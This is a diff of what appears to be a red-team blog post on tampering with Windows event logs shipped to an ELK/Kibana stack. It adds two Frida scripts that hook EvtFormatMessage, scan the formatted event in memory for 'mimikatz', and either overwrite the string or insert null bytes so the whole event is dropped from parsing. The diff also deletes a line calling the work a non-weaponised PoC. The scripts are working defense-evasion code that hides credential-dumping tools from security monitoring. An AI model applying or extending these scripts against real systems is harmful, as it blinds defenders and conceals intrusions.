@@ -198,13 +198,77 @@ BOOL EvtFormatMessage(
 
 ```
 
+Let's break down the script piece by piece.
+
+On the first part, we extract thee arguments we're going to need for our analysis. The 7th and 8th arguments are respectively the pointer to the string that will be populated with the formatted event and the size of the event itself:
+```
+onEnter: function (log, args, state) {
+  this.ptr = args[7];
+  this.size = args[6].toInt32();
+
+},
+```
+
+After the function terminates, we perform a synchronous scan of the memory starting from the address we previously extracted. The `pattern` variable will hold the bytes which we're scanning for:
+```
+var res = Memory.scanSync(
+    this.ptr,
+    this.size,
+    pattern
+);
+```
+
+For each result of the scan, we patch the bytes with something else:
+
+```
+res.forEach(function(f){
+    send("Patching: " + f.address);
+    Memory.protect(f.address, 16, "rwx");
+    f.address.writeByteArray([0x6c,0x00,0x6f,0x00,0x6c,0x00,0x69,0x00,0x6b,0x00,0x61,0x00,0x74,0x00,0x7a,0x00])
+});
+```
+
+Let's try executing mimikatz:
+
 ![](/assets/2020-03-21-fooling-the-blue-team-abusing-insecure-elk/91b0bed64528d8acb5e56224fbd3f933.png)
 
 Within Kibana, the data was correctly tampered:
 
 ![](/assets/2020-03-21-fooling-the-blue-team-abusing-insecure-elk/cb3c783d1d89a254879f747802dbc009.png)
 
-Clearly, this is just a PoC and it's pretty useless on its own. However with some work it would be quite easy to extend this to hide other things or just drop unwanted events. Additionally, the API I chose to hook might not even be the most convenient option but, again, the aim was to prove a capability and not to weaponise.
+Doing a simple string substitute is useful, but sometimes we might just want to drop specific events. To do so, we can hook the same function using frida and instead of replacing the matched bytes (`mimikatz` in our case) we can break the XML parser and the event will just be dropped.
+
+Now, my Frida skills are pretty limited and therefore I had to ask some help to the Frida master Stefano ([@r3dx0f](https://twitter.com/r3dx0f)). After some classic Italian swearings, we managed to drop the events that matched a particular keyword.
+The resulting script is the following:
+
+```
+
+{
+onEnter: function (log, args, state) {
+    this.ptr = args[7];
+    this.size = args[6].toInt32();
+
+  },
+
+  onLeave: function (log, retval, state) {
+    var pattern = "6d 00 69 00 6d 00 69 00 6b 00 61 00 74 00 7a 00"; //mimikatz
+            var res = Memory.scanSync(
+                this.ptr,
+                this.size,
+                pattern
+            );
+
+            if (res.length > 0){
+              send("Patching: " + ptr(this.ptr));
+              Memory.protect(ptr(this.ptr), 16, "rwx");
+                ptr(this.ptr).writeByteArray([0x00,0x00,0x2f,0x00,0x45,0x00,0x76,0x00,0x65,0x00,0x6e,0x00,0x74,0x00,0x3e,0x00])
+            }  
+  }
+}
+```
+Pretty f***ing evil right?
+
+The difference between this and the previous script is the following: after checking if the `Memory.scanSync` function has more than one result, we go back at `this.ptr` (which is the pointer to the start of the event entry) and add a `0x00,0x00` (null byte, UTF-16) that breaks the entire parsing.
 
 ## Conclusion
 
